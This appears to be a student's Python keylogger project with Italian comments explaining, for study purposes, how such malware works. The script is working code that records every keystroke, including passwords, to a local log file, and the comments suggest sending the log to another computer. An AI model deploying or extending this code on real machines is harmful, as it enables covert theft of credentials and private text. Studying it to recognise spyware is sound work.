#Keylogger in parole semplici
#Immagina un programma che scrive tutto quello che premi sulla tastiera, come se fosse una specie di "diario" segreto che registra ogni tasto che usi.
#Per esempio, se scrivi un messaggio o una password, questo programma lo "ascolta" e lo salva da qualche parte.
#Serve a capire come funzionano certi malware (virus) che fanno proprio questo per rubare informazioni senza che tu lo sappia.
#Facendo questo progetto, impari come si può catturare e salvare ciò che scrivi sulla tastiera.
#Poi puoi anche fare cose più avanzate, tipo mandare questi dati registrati a un altro computer oppure proteggerli con la cifratura (cioè renderli illeggibili per gli altri).
#In pratica, il progetto ti fa capire come i malware spiano cosa scrivi e ti insegna a riconoscerli o crearne uno semplice per studio.

from pynput import keyboard
# viene eseguita ogni volta che premi un tasto.
def on_press(key):
    try:
        #Quando premi un tasto normale(lettura,numero)
        with open("log.txt", "a") as log_file:
            log_file.write(key.char)
      
    except AttributeError:
        #Quando premi tasti speciali (es spaziom invio, backspace)
        with open("log.txt","a") as log_file:
            log_file.write(f'[{key}]')
       
def on_release(key):
    #se premi ESC, interrompi il programma
    if key == keyboard.Key.esc:
        return False

#Avvia l ascolto della tastiera
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
